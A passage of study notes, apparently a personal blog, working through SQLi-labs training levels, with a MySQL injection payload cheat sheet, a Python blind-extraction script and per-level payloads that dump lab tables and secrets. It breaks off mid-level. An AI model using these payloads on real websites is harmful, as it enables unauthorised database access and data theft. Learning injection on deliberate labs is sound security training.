---
title: "SQLi-labs Study Notes"
slug: gkguiw
translationKey: gkguiw
date: 2020-04-05T15:22:32+08:00
source: yuque/penetration
---

> bypass
>
> [https://xz.aliyun.com/t/7767](https://xz.aliyun.com/t/7767)
>
> ODBC: [https://forum.butian.net/share/113](https://forum.butian.net/share/113)
>
> [https://www.o2oxy.cn/2772.html](https://www.o2oxy.cn/2772.html)
>
> 
>
>

# Common Payloads
![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586599797233-1453d801-5d9a-479c-876c-12f33e0854ab.png)

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586403342343-7b65273a-1679-4d86-ae09-ff008cdeece7.png)



```markdown
# Test!
LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
```



```markdown
# UNION BASED
## List all databases
union select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA

# List all tables in the test database (hex works everywhere too)
union select group_concat(TABLE_name) from information_schema.tables where table_schema=`test`

# List all columns in (database: test, table: admin)
union select group_concat(COLUMN_NAME) from information_schema.COLUMNS where
TABLE_SCHEMA=`test` and TABLE_NAME=`admin`

UNION SELECT 1,2,group_concat( column_name,0x20)) from information_schema.columns

# valid queries
id=1' AND 1=2 union select 1,2,(select group_concat() from information_schema.schemata) -- +
id=1' AND 1=2 union select 1,2,(select group_concat() from information_schema.tables where table_schema='security')-- #
id=1' AND 1=2 union select 1,2,(select group_concat() from information_schema.columns where table_name='users') -- +

- Note: group_concat can be used without GROUP BY, but it must contain column names, not subqueries
- The echoed output often has a length limit


# ERROR BASED (error-based injection)
updatexml('2',concat('~',(select current_user()),'~'),'2')-- -
extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1),'~'));-- -	
select from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x )x-- -

- concat can be replaced with concat_ws, and group_concat can consolidate the results


# BLIND SQL injection (boolean-blind, time-based)
id = 1" and sleep(0)='1' -- -
id=1" and if(1=1, sleep(3) , 1 ) -- -
id=1 and 1=(case when (2=2) then sleep(5) else 1 end) -- #

- For blind injection, it seems you can only determine the closing character by whether a delay occurs
- The statement after CASE WHEN must be wrapped in parentheses, otherwise it won't succeed


 # Basic information
		select @@basedir
		select @@datadir
		select current_user()

		select version()
		select @@version
		select database()
		select @@database
    
# POC
extractvalue(0X20, concat(0x5c, (VERSION（)),'~'));-- -	
```

+ For error-based injection the syntax must be error-free; **close whatever needs to be closed**, e.g. with a comment (`-- -`)
+ Conclusion: generally, wherever blind injection works, you can also use `outfile|dumpfile|load_file`.
+ Blind injection falls into two categories: boolean-based blind injection + time-based blind injection.

Since there is no true/false echo — no difference whatsoever visible in the response (response includes: response size / status code / page text) — delay functions are the only option. Generally `sleep` and `benchmark` can be used as delay functions, but the article below describes a new way to introduce a delay.

> [Five Delay Methods for MySQL Time-Based Blind Injection (PWNHUB unintended solution)](https://www.cnblogs.com/-qing-/p/10894310.html)
>



## Common Scripts
[https://github.com/hi-unc1e/some_scripts](https://github.com/hi-unc1e/some_scripts)





## Handler Injection


ref

+ [https://www.cnblogs.com/hello-there/p/12882991.html](https://www.cnblogs.com/hello-there/p/12882991.html)



Column-name-less injection (commas banned)

```markdown
union select 1,2,3 <=>
	union select * from (select 1)a join (select 2)b join (select 3)c

limit 2,1 <=>limit 1 offset 2
```

## ORDER BY Injection


```shell
order by 1,(case when (1=1) then 1 else 0 end)

# PGSQL: you need [1/$] to change operator precedence
order by
	tstamp, 1/(case when (11=111) then 1 else 0 end)
```

> Injection points after ORDER BY: SQL pre-compilation solves SQL injection, but some places cannot be parameterized. For example, what follows ORDER BY cannot be parameterized. When hunting for injections, keep an eye on orderby and sort parameters — a sure hit every time.
>
> Why can't ORDER BY be parameterized in queries? [See here](https://www.cnblogs.com/lsdb/p/12084038.html)
>
> 
>
> It's a string, yet you can't add quotes (otherwise the query errors out)
>
> Pre-compilation (parameterization) adds quotes automatically
>
> 
>
> Cannot pre-compile => leads to injection
>

Injections occurring after the ORDER BY clause have the following characteristics:

+ No arithmetic can be performed, i.e. `sort=2` and `sort=(3-1)` are not the same
+ If you directly use `if(1=2,1,SLEEP(2))`, the sleep time becomes 2 × the number of records in the current table, **which amounts to a denial-of-service attack on the server.** It's recommended to verify time-based injection with a sub-statement, e.g. `if(1=2,1,(select 1 from (select SLEEP(2))x))`
+ In special cases UNION injection works, e.g.

```basic
$query = "(select * from test order by user_id $evil);";
```

In this case inject with `) UNION (SELECT 1,(version()),3)-- `, as shown below.

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621907884225-20d3a2cd-ef72-4b02-b107-ee75512529b4.png)



ref

+ [Mysql-Order-By-Injection-Summary](https://www.cnblogs.com/icez/p/Mysql-Order-By-Injection-Summary.html)
+ [Penetration Experience Sharing: Expanding SQL Injection Ideas - Xianzhi community](https://xz.aliyun.com/t/7919)





## Injection after LIMIT
> 1. If no ORDER BY clause precedes LIMIT, you can inject directly with UNION SELECT
>
> 2. If an ORDER BY clause precedes LIMIT and the MySQL version is between 5.0.0 and 5.7.18, try the PROCEDURE stored-procedure extension and the ANALYSE function
>
> `PROCEDURE ANALYSE()` is deprecated as of MySQL 5.7.18, and is removed in MySQL 8.0.
>

Error-based injection, payload as follows

```sql
LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x7c,version())),rand());


# mysql> select `table_name` from information_schema.tables limit 0,1 procedure analyse(extractvalue(rand(), concat(0x7c, version(),0x7c)),rand());
ERROR 1105 (HY000): XPATH syntax error: '|5.5.44-0ubuntu0.14.04.1|'
```

If error output isn't available, you can use time-based injection — but not with sleep(), which throws `ERROR 1105 (HY000): Only constant XPATH queries are supported`

```sql
PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
// Although it errors out, there really is a delay
1' when the CASE is true: delay, then the error
2' when the CASE is false: immediate error
```

ref

+ [https://www.cnblogs.com/qing123/p/4575901.html](https://www.cnblogs.com/qing123/p/4575901.html)
+ [https://xz.aliyun.com/t/5858](https://xz.aliyun.com/t/5858)






## Injection Without Inserting Data (INSERT / UPDATE Injection)
The Wangding Cup featured an unconventional injection technique: completing an injection within an INSERT statement without actually inserting data, using the pow(999,999) overflow error.

First, let's look at the following statements

```sql
# When (1=1) is true, the query errors. That is, when (QUERY) is true, the query errors out.
mysql> select `table_name` from information_schema.tables where （1=1） and pow(999,999);
ERROR 1690 (22003): DOUBLE value is out of range in 'pow(999,999)'

# When (1=0) is false, the query result is empty. That is, when (QUERY) is false, the result set is empty.
mysql> select `table_name` from information_schema.tables where （1=0） and pow(999,999);
Empty set (0.00 sec)


```

+ Error => query is true
+ Empty result => query is false

With the True/False response behavior pinned down, you'll immediately realize this is really just boolean-based blind injection — you can exfiltrate data without inserting anything into the database.

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592584010906-15ef6e01-2828-4435-98d9-e994ea291895.png)

**Root-cause analysis** (the following is purely my own understanding):

Because `（QUERY）and pow(999,999)` uses a binary operator that is only true when both sides are true — as soon as it hits a false it **immediately** returns false and performs no further computation. In other words, `and` here operates in three states: True, False, and Error; we exploit the difference between the latter two states to implement blind injection.

**Summary**

1). When the query `QUERY` is false, MySQL does not evaluate the following `pow(999,999)` and simply returns `false`;

2). When the query `QUERY` is true, MySQL evaluates the following `pow(999,999)`; since the number is too large and overflows, it of course errors out.

**Closing characters**

```markdown
# Closing characters
0|()-- 
0'|()-- 
0"|()-- 
0)|()-- 
0')|()-- 
0")|()-- 
0))|()-- 
0'))|()-- 
0"))|()-- 
0)))|()-- 
#####################################
# When single quotes are filtered (stripped)
0%df'|()-- 
0%df')|()-- 
0%df'))|()-- 
#####################################
# When double quotes are filtered
0%df"|()-- 
0%df")|()-- 
0%df"))|()-- 
#####################################
0'|()|''='1-- 
0"|()|''='1-- 
0)|()|''='1-- 
0')|()|''='1-- 
0")|()|''='1-- 
0))|()|''='1-- 
0'))|()|''='1-- 
0"))|()|''='1-- 
0)))|()|''='1-- 
#####################################
0'||()||''='1
```



---

# Less-65:Challenge-12
The closing character is `")` — tweak the exploit and charge!

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1594118424392-b412f696-0ba2-4e37-be09-fd9a140da722.png)

# Less-64:Challenge-11
The closing character is `))`, same as the previous two levels

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1594112721743-b49f3017-41f2-41ba-a551-1bfd11a8270d.png)

# Less-63:Challenge-10
The closing character is a single quote `'`

Just tweak the closing character in the script and you're set — pure comfort

```markdown
# less43-exp.py
# coding=utf-8
# author:unc1e
import requests
import string

# mysql> select ascii('1'), (select substring(ascii('1'),1,1)), (select substring(ascii('1'),2,1));
# +------------+------------------------------------+------------------------------------+
# | ascii('1') | (select substring(ascii('1'),1,1)) | (select substring(ascii('1'),2,1)) |
# +------------+------------------------------------+------------------------------------+
# |         49 | 4                                  | 9                                  |
# +------------+------------------------------------+------------------------------------+

def str_to_hex(s):
    '''
    :param s:
    :return: convert the string to a hex value prefixed with 0x
    '''
    return '0x'+''.join([hex(ord(c)).replace('0x', '') for c in s])

# initialize param
url = "https://sec4ever.cn/Less-63/index.php?id=0' "
reset_url ="https://sec4ever.cn/sql-connections/setup-db-challenge.php?id={}".format(url.split("sec4ever.cn")[1])   # /sql-connections/setup-db-challenge.php?id=/Less-60/index.php


TIMEOUT = 8
VERIFY = True

table_name_len = len('UX9CUK2CIC')
flag_len = len('uwpeCvsrLcadsa8P7wSn9Ix4')

charIndexSet =  ["Dumb","Angelina","Dummy","secure","stupid","superman","batman","admin","admin1","admin2","admin3","dhakkan","admin4"]   # string characteristics, index is from 0-9
charIndexSet_rev = charIndexSet[::-1] 
Set =  [ -3, -2, -1 ]   # take the hundreds + tens + ones digits of the string's ASCII value
# ones digit: substring((query),-1, 1)
# tens digit: substring((query),-2, 1);
# hundreds digit: substring((query),-3, 1),

# initialize
sess = requests.session()

def req2getOneChar(xurl, payload, start, end):
    '''

    :param xurl: base url
    :param payload: (select group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573)
    :param start ,end: [start, end]
    :return:
    '''

    asciiValue = ['0','0','0'] # hundreds, tens, ones
    flag = ""
    for l in range(start, end+1):
        for k, kv in enumerate(Set):# fetch first
            # k = 0, 1, 2
            # kv = -3, -2, -1 used with substring to get each digit of the ASCII value
            url = xurl + "or id=" + "substring(ascii(substring(({payload}), {l}, 1)), {kv}, 1)".format(payload=payload, l=l, kv=kv ) + '-- -'
            #print(url)
            resp = sess.get(url=url, timeout=TIMEOUT, verify=VERIFY)
            for i in range(1, 10):# iterate over the characteristic values 1-9, for(1,10)
                s1 = 'Your Login name : ' + charIndexSet[i]# "Dumb"
                e1 = 'Your Password : ' + charIndexSet_rev[i]#admin4
                if( resp.text.count(s1) > 0  and resp.text.count(e1) > 0):
                    # If the page contains the current characteristic value, its index is taken as the value of the corresponding digit (0-9)
                    # e.g. if the page contains both Angelina and dhakkan, this digit is 1
                    asciiValue[k] = str(i) # 0 is the ones digit, 1 is hundreds and tens
                    break
                else:
                    asciiValue[k] = '0'
                    continue

        foo = int(asciiValue[0] + asciiValue[1] + asciiValue[2])# e.g. '4'+'9' => 49, '10'+'2'=102
        flag += chr(foo)    #chr(49)='1'
        print("[-]current content is:{}".format(flag))
    if flag != '':
        return flag
    else:
        print("[!]req2getOneChar ERROR!")


# step 1: get the table names
def getTables():
    # P79FGLN0JK
    payload = '''(select group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573)'''
    table_name = req2getOneChar(xurl=url, payload=payload, start=1, end=table_name_len)
    print("[-]table_name is:{}".format(table_name))
    return table_name



def getColumn():
    '''
    Get the column names,
    --------------------------
content id,sessid,secret_Y1P6,tryy
              ↑         ↑
position      11        21
    --------------------------
    '''
    # step 2: get the column names
    payload = '''(select group_concat(column_name) from information_schema.columns where table_schema=0x6368616c6c656e676573 and table_name={table})'''.format(table=str_to_hex(table_name))
    column_name = req2getOneChar(xurl=url, payload=payload, start=11, end=21)

    if "secret" in column_name:
        print("[+]column_name is:{}".format(column_name))
        return column_name
    else:
        print("step2 failed!")

# reset the attempt counter
sess.get(url=reset_url, verify=VERIFY)

# exploit
table_name = getTables()
column_name = getColumn()


# step 3: get the flag
payload = '''(select {} from {})'''.format((column_name), (table_name))
flag = req2getOneChar(xurl=url, payload=payload, start=1, end=flag_len)
print("[+]FLAG is:{}".format(flag))
```



# Less-62:Challenge-9
boolean injection, close char is `')`, via `/Less-62/?id=1') and 1=2 -- -`and`/Less-62/?id=1') and 1=1 -- -`

Reference script: [https://github.com/hi-unc1e/some_scripts/blob/master/boolean_sqli_exp.py](https://github.com/hi-unc1e/some_scripts/blob/master/boolean_sqli_exp.py)

```markdown

```

The run result is shown below — satisfying

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1594111563293-dccec4bc-b117-4c14-af8b-ab095114a2ea.png)

# Less-61:Challenge-8
close_chars is `'))` , can be mounted via  `/Less-61/?id=1')) and 1=2 -- -`

so adjust my exploit script, get the flag...

```markdown
[+]table_name is:UX9CUK2CIC
[+]column_name is:secret_9BN9
[+]flag is:l55fc3v4TvJZk7GAspprtOAh	
```


# exp
![](https://cdn.nlark.com/yuque/0/2020/png/166008/1593922201970-9c162cca-f873-4380-8399-faa205c778f2.png)

```markdown
$ /root/TODO/sqli-lab/blind-sqli/venv/error_based_exp.py
[+]table_name is:OTTEP9Q92I
[+]column_name is:secret_GRH1
[+]flag is:mcnTThCOxqzeD2ok8CJgKjfn
```

# Less-60:Challenge-7
The closing character is `")`

```markdown
# /Less-60/index.php?id=1") and extractvalue(rand(),concat(0x7c,(select group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573),0x7c))%20 -- -
XPATH syntax error: '|3BYH4G78SZ|'

# /Less-60/index.php?id=1") and extractvalue(rand(),concat(0x7c,(select group_concat(column_name) from information_schema.columns where table_schema=0x6368616c6c656e676573 and table_name=0x3342594834473738535a),0x7c))%20 -- -
 XPATH syntax error: '|id,sessid,secret_Y1P6,tryy|' 
 
# /Less-60/index.php?id=1") and extractvalue(rand(),concat(0x7c,(select secret_Y1P6 from 3BYH4G78SZ),0x7c))%20 -- -
XPATH syntax error: '|uwpeCvsrLcadsa8P7wSn9Ix4|'
```

# Less-59:Challenge-6
> Less than 5 attempts
>

Error-based injection, integer-type injection point, no closing character needed

```markdown
# /Less-59/index.php?id=1 and extractvalue(rand(),concat(0x7c,(select group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573),0x7c))%20 -- -
 XPATH syntax error: '|MDAMM2TQC0|' 
 
# /Less-59/index.php?id=1|| extractvalue(rand(),concat(0x7c,(select group_concat(column_name) from information_schema.columns where table_schema=0x6368616c6c656e676573 and table_name=0x4d44414d4d3254514330),0x7c))%20 -- -
 XPATH syntax error: '|id,sessid,secret_8OOF,tryy|' 

# /Less-59/index.php?id=1 ||extractvalue(rand(),concat(0x7c,(select secret_8OOF from MDAMM2TQC0),0x7c))%20 -- -
 XPATH syntax error: '|CoyCW2IfA9AcJ0hkK2qLNC9v|' 
```



# Less-58:Challenge-5
Error-based injection; a single quote closes the statement

```markdown
# poc
/Less-58/index.php?id=2' or extractvalue(rand(),concat(0x7c,(version()),0x7c) )-- -
```

```markdown
# /Less-58/index.php?id=0' || extractvalue(rand(),concat(0x7c,(select group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573),0x7c))%20 -- -
 XPATH syntax error: '|BOE8SLA8JQ|' 
 
# /Less-58/index.php?id=0' || extractvalue(rand(),concat(0x7c,(select group_concat(column_name) from information_schema.columns where table_schema=0x6368616c6c656e676573 and table_name=0x424f4538534c41384a51),0x7c))%20 -- - 
 XPATH syntax error: '|id,sessid,secret_FQB6,tryy|' 
 
# /Less-58/index.php?id=0' || extractvalue(rand(),concat(0x7c,(select secret_FQB6 from BOE8SLA8JQ),0x7c))%20 -- -
 XPATH syntax error: '|B0vjwa55UVF1zg6dk82s5YB7|' 
```



# Less-57:Challenge-4
The closing character is `"`

```markdown
# /Less-57/index.php?id=0" union select 11,22,group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573 -- -
Your Password:ABM2UNYI3Q 

# /Less-57/index.php?id=0" union select 11,22,group_concat(column_name) from information_schema.columns where table_schema=0x6368616c6c656e676573%20 and table_name=0x41424d32554e59493351-- -
Your Password:id,sessid,secret_6DIE,tryy 

# /Less-57/index.php?id=0" union select 11,22,group_concat(secret_6DIE) from ABM2UNYI3Q-- -
Your Password:tZu9ubeDFgkGhooKCpNZcxwI 
```



# Less-56:Challenge-3
> Get the result within 14 attempts
>

The closing character is `')`

```markdown
# /Less-56/index.php?id=0') union select 11,22,group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573 -- -
Your Password:EBO6LSIRQE 

# /Less-56/index.php?id=0') union select 11,22,group_concat(column_name) from information_schema.columns where table_schema=0x6368616c6c656e676573%20 and table_name=0x45424f364c5349525145-- -
Your Password:id,sessid,secret_4UZO,tryy 

# /Less-56/index.php?id=0') union select 11,22,group_concat(secret_4UZO) from EBO6LSIRQE-- -
Your Password:8amWDI2U8nxTFu6BqEDF7WlM 
```




# Less-55:Challenge-2
> The result must be obtained within 14 attempts
>

`/Less-55/?id=2-1` reveals this is an integer-type injection point

```markdown
# 

# /Less-55/index.php?id=0) union select 11,22,group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573 -- -
Your Password:Q5X3TPYWK7 

# /Less-55/index.php?id=0) union select 11,22,group_concat(column_name) from information_schema.columns where table_name=0x59414e52364d46534453 and table_schema=0x6368616c6c656e676573 -- -
Your Password:id,sessid,secret_IIJI,tryy

# /Less-55/index.php?id=0) union select 11,22,secret_IIJI from Q5X3TPYWK7 -- -
Your Password:yTWvRRHETnXIo38rWajAOFb4 
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1593697751110-7b819b16-056e-4f55-ac7e-539b3631c15e.png)

# Less-54:Challenge-1
> The objective of this challenge is to dump the **(secret key)** from only random table from Database _**('CHALLENGES')**_ in Less than 10 attempts
>
> For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.
>

The goal of this level is to find the flag in a database called `CHALLENGES`, with only 10 requests allowed — after ten attempts you must reset, and the table and column names change as a result (random values).

Union-based injection

```markdown
# poc
/Less-54/?id=0' union select 11,22,33 -- -
```

```markdown
//List the database names
#

//List the table names
# /Less-54/index.php?id=0' union select 11,22,group_concat(TABLE_name) from information_schema.tables%20 where table_schema=0x6368616c6c656e676573-- -
Your Password:N9K0T2B5HK

//Column names
# /Less-54/index.php?id=0' union select 11,22,group_concat(column_name) from information_schema.columns%20 
	where table_schema=0x6368616c6c656e676573 
  and table_name=0x4e394b3054324235484b-- -
Your Password:id,sessid,secret_ZRYE,tryy 

//flag
# /Less-54/index.php?id=0' union select 11,22,secret_ZRYE from%20 N9K0T2B5HK-- -
Your Password:zbEMB0vRz6OS2aawzyvIiT5l


```

Level cleared!

Along the way I also reviewed the structure of the information_schema tables

reference

+ [https://blog.csdn.net/qq_37133717/article/details/93498444](https://blog.csdn.net/qq_37133717/article/details/93498444)

# Less-53 - ORDER BY Clause Blind based
The closing character is a single quote; with no error output, go straight to the blind-injection payload

```markdown
# poc
/Less-53/?sort=1',if(1=1,id,username)-- -
```

# Less-52 - ORDER BY Clause Blind based
No closing needed — go straight to the blind-injection payload. Both `case when then else end` and `if` work; I just personally prefer `if`

```markdown
# /Less-52/?sort=if(left(version(),2)='5',username ,exp(999))
[false] no results echoed on the page

# /Less-52/?sort=if(left(version(),1)='5',username ,exp(999))
[true] results echoed on the page
```

Based on the differences in page output, you can extract the data one character at a time

# Less-51 - ORDER BY Clause Blind based
Similar to the previous level, except the statement must be closed on both sides: the front is closed with a single quote, and the back can be closed either with a comment or with a binary operator + single quote (e.g. `and '`)

Error-based injection

```markdown
# /Less-51/?sort=2',extractvalue(rand(),concat(0x7c,version(),0x7c)) -- -
 XPATH syntax error: '|5.7.30-0ubuntu0.18.04.1|' 
```

Blind injection works the same way

```markdown
/Less-51/?sort=0',if(left(version(),1)='5', username,id) -- -
```

# Less-50 - ORDER BY Clause Blind based
No closing character needed and errors are shown; the differing output of `/Less-50/?sort=2,0` and `/Less-50/?sort=2,1` confirms the injection point

Use error-based injection to grab the information

```markdown
/Less-50/?sort=2,extractvalue(rand(),concat(0x7c,version(),0x7c))
```

Boolean blind injection

```markdown
# poc
/Less-50/?sort=if(1=1, username,id)
/Less-50/?sort=if(1=2, username,id)

# exp
/Less-50/?sort=if(left(version(),1)='5', username,id)
...
```



# Less-49 - ORDER BY Clause Blind based
To run blind injection against ORDER BY, you not only need to check whether a single quote is required to close the statement, but also remember to **add the comma**!

```markdown
# poc
/Less-49/?sort=',USERNAME -- -
/Less-49/?sort=1',IF(1=1,`username`,0) -- -

## The two below differ in ordering
/Less-49/?sort=1',IF(length(version())>119,`username`,0) -- -
/Less-49/?sort=1',IF(length(version())>9,`username`,0) -- -

# exp
/Less-49/?sort=1',IF(length(version())=23,`username`,0) -- -
/Less-49/?sort=1',IF(left(version(),1)='5',`username`,0) -- -
/Less-49/?sort=1',IF(left(version(),2)='5.',`username`,0) -- -
...
/Less-49/?sort=1',IF(left(version(),23)='5.7.30-0ubuntu0.18.04.1',`username`,0) -- -
```

# Less-48 - ORDER BY Clause Blind based
Boolean blind injection POC

```markdown
# /Less-48/?sort=1,0
no output

# /Less-48/?sort=1,1
output present
```

For the exploit, either `case when [query] then [1] else [2] end` or `IF([query], [1], [2])` works

+ Note the `[1] [2]` positions **cannot be numbers** — not even with backticks. Only strings, such as `test`

```markdown
# exploit to extract data
## /Less-48/?sort=if(length(version())>99,username,1)
 order is 8 9 10
 
## /Less-48/?sort=if(length(version())>1,username,1)
 order is ascending 1-9
```

Exploiting the different result orderings when the `[query]` statement is true/false, you can extract the data one character at a time

# Less-47 - ORDER BY Clause-Error-Single quote
`order by 1` and `order by '1'` are different — meaning single quotes won't work. But backticks ``` do (case-insensitive)

Adding a single quote errors out, so the closing character must be a single quote; use a binary operator to close the statement

```markdown
# /Less-47/?sort=' and extractvalue(0x20,concat(0x7c7c,version(),0x7c7c)) ||'
 XPATH syntax error: '||5.7.30-0ubuntu0.18.04.1||'	
```

# Less-46 - ORDER BY-Error-Numeric
Injection after ORDER BY has the following characteristics

+ No arithmetic can be performed, i.e. `sort=2` and `sort=(3-1)` differ
+ If you directly use `if(1=2,1,SLEEP(2))`, the sleep time becomes 2 × the number of records in the current table, **which amounts to a denial-of-service attack on the server.** It's recommended to verify time-based injection with a sub-statement, e.g. `if(1=2,1,(select 1 from (select SLEEP(2))x))`

```markdown
# poc
## The results below differ
	rand(1=2)
	rand(1=1)
```

Visiting `/Less-46/?sort=1,0` reveals something odd; adding a single quote exposes error details in the response

Use `/Less-46/?sort=3-- -` to confirm the injection point is numeric — no extra closing character needed

**Error-based injection**

```markdown
# /Less-46/?sort=extractvalue(rand(),concat(0x7c,version(),0x7c))--+-
XPATH syntax error: '|5.7.30-0ubuntu0.18.04.1|'
```

**Blind injection**

```markdown
# boolean injection poc


# delay injection poc
/Less-46/?sort=select 1 from (select sleep(5))x-- -
```

# Less-45 - Stacked Query Blind based twist
Boolean blind injection; extract data based on differences in the page output

```markdown
# poc 
## login_user=admin&login_password=adm') or 11=11 -- -&mysubmit=Login
	[true] status code 302, redirect to the home page
  
## login_user=admin&login_password=adm') or 11=00 -- -&mysubmit=Login
	[false] status code 200, and contains slap1.jpg, i.e. the source contains <img src="../images/slap1.jpg">
```



# Less-44 - Stacked Query blind
The page shows no error details, only two possible response states; POC below

```markdown
# true
// It's a universal password, so it's true
## login_user=admin&login_password=a'+or+1=1--+-&mysubmit=Login
[true] page 302 redirect

## login_user=admin&login_password=a'+or+1=0--+-&mysubmit=Login
[false] status code 200
```



# Less-43 - Stacked Query
A single quote errors out, and the comment characters are banned

Still going with error-based injection

```markdown
login_password=1'+||+extractvalue(0x20,concat(0x7c,version(),0x7c))+or'
```

# Less-42 - Stacked Query error based
A failed login greets you with `bug off hacker` — what a trash-talking programmer

Error-based injection

```markdown
login_password=1' and extractvalue(0x20,concat(0x7c,version(),0x7c)) -- -
```

Stacked-query injection

Skipped. Didn't feel like building an exploit...

Blind injection (boolean + time-based)

```markdown
# poc
login_password=2'+order+by+3--+-;

# exp
login_password=0'+union select 1,2,3 from (select sleep(1))x;--+-

```

# Less-41 **stacked Query Intiger type blind**
Closing: `/Less-41/?id=1  -- -`

```markdown
# union based
/Less-41/?id=0 union select 1,2,3

# blind 
/Less-41/?id=1 ^ 5

  ## POC:null
  /Less-41/?id=1 and if(1=1,0,1)

  ## POC:true
  /Less-41/?id=1 and if(1=1,1,1)
```

# Less-40 **stacked Query String type Blind**
`/Less-40/?id=1') -- -` confirms the closing character is `')`

Boolean blind injection with no output

UNION BASED — union injection slipped my mind again...

```markdown
# POC 
/Less-40/?id=0') union ALL select 1,22,('33
	or
/Less-40/?id=0') union select 1,22,3 -- -

# sqlmap poc
id=-7067') UNION ALL SELECT NULL,CONCAT(0x7178627671,0x6b7375687a726b446c4746706e6b4f585273466b7655614d51667851434e7a55666e5671615a794d,0x71626a7671),NULL-- -

```

# Less-39 **stacked Query Intiger type**
Error-based injection

```markdown
/Less-39/?id=1 and extractvalue(0x20,concat(0x7c,version(),0x7c))-- -
```

Union base injection

```markdown
/Less-39/?id=0 union select 11,22,33
```

delay injection(boolean)

```markdown
/Less-39/?id=0 union select 1,2,1 from (select sleep(5))x;
```

# Less-38 **stacked Query**
Stacked-query injection

Error-based injection

```markdown
/Less-38/?id=1' and extractvalue(rand(),concat(0x7c,version(),0x7c))-- -
```

Union-based injection

```markdown
/Less-38/?id=0' union select 1,group_concat(username),group_concat(password) from users -- -
```

Insert a user

```markdown
/Less-38/?id=1;insert into users(username,password) values('stack', 'stack')%23
```

# Less-37- MySQL_real_escape_string
The same error-based injection, just inside a `POST` request

```markdown
POST 
...

uname=admin+%df%27or+%27%27%3D%27&passwd=111&submit=Submit
```

# Less-36 **Bypass MySQL Real Escape String**
Wide-byte: `%df%27` works as a single quote

```markdown
# Error-based injection
/Less-36/?id=1%df%27%20and%20extractvalue(rand(),concat(0x7c,version(),0x7c))--%20-
```

# Less-35 **why care for addslashes()**
Integer-type injection point

Blind injection

```markdown
# /Less-35/?id=1 and 1=1
results returned

# /Less-35/?id=1 and 1=2
no results
```

Union-based injection

```markdown
# /Less-35/?id=1 order by 3-- -
results returned

# /Less-35/?id=1 order by 4-- -
 Unknown column '4' in 'order clause' 

```

Error-based injection

```markdown
/Less-35/?id=1 and extractvalue(rand(),concat(0x7c,version(),0x7c))
```

# Less-34- Bypass Add SLASHES
Long live fuzzing: Burp's `battering ram` mode with the `brute forcer` payload over `0123456789` gives you `00-99`

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1593017382227-985b4647-cc96-45e1-9531-16ce92ae90e6.png)

Eventually you land on a usable value; here `%99` is used as an example (`%df` also works)

```markdown
# POST poc
## uname=admin%99%27and+extractvalue(rand(),concat(0x7c,version(),0x7c))--+-&passwd=admin%99%27&submit=Submit
	XPATH syntax error: '|5.7.30-0ubuntu0.18.04.1|'

```

In fact, you can fuzz all the way from 00 to ff

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1593017824176-21af679a-2032-4dd3-9905-63fffa028fa0.png)

# Less-33 — for some unknown reason, this level's environment is identical to 32
Skipped

# Less-32 **Bypass addslashes()**
Wide-byte injection: use `%df` to swallow the backslash `\` added by `addslashes()`, and error-based injection follows

```markdown
/Less-32/?id=1%df' and extractvalue(0x20,concat(0x7c,version(),0x7c))-- -
```

Of course, as long as you can escape the single quote, blind injection works too

```markdown
# Blind injection poc
/Less-32/?id=1%df'and 1=0 -- -
```

Also, with output on the page, UNION injection works as well

```markdown
# Determine the column count with order by
## /Less-32/?id=1%df%27%20order%20by%204%20--%20-
 Unknown column '4' in 'order clause' 
 
## /Less-32/?id=1%df%27%20order%20by%204%20--%20-
 Your Login name:Dumb
Your Password:Dumb 
```

[https://sec4ever.cn/Less-18/](https://sec4ever.cn/Less-18/)

# Less-31 FUN with WAF
Adding a double quote errors out; the comment `-- -` is not filtered

```markdown
Guess the column count
# /Less-31/?id=1") order by 3-- -
(normal result)

# /Less-31/?id=1") order by 4 -- -
(error)
Unknown column '4' in 'order clause'
```

Only the closing character differs from the previous level — here it's `")`. In the end I used union injection + group_concat to pull out all the data in one shot.

```markdown
/Less-31/?id=0")%20 unIOn seLEct 1,group_concat(username),group_concat(password) from users -- -
```

Error-based injection also works; I won't paste the `payload` here

# Less-30
This level also has a WAF, yet quotes, `order by`, `union select `, and comments all work — this WAF is genuinely trash

```markdown
# poc
/Less-30/?id=0" unIOn seLEct 1,2,3 -- -

# union based sqli
/Less-30/?id=0" unIOn seLEct 1,group_concat(username),group_concat(password) from users -- -
```



# Less-29 Protection with WAF
Where's the promised WAF?

— It filters neither quotes nor `and` `or`

Error-based injection — straight in

```markdown
 # /Less-29/?id=0' or extractvalue(0x20,concat(0x7c,version(),0x7c))-- -
   XPATH syntax error: '|5.7.30-0ubuntu0.18.04.1|' 
```

UNION-based injection

```markdown
# Table names
/Less-29/?id=0' union select 1,group_concat(table_name,0x20) ,group_concat(table_schema,0x20) from information_schema.tables where '1

# Data
/Less-29/?id=0' union select 1,group_concat(username,0x20) ,group_concat(password,0x20) from users where '1
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592746584181-b75630ad-ba36-4716-a8fe-2cd7e17d5b60.png)



# Less-28a Trick with SELECT & UNION
```markdown
#  Closing
/Less-28a/?id=1') -- -

# Column count
/Less-28a/?id=1')%20 order by 4 -- -

# Extract data
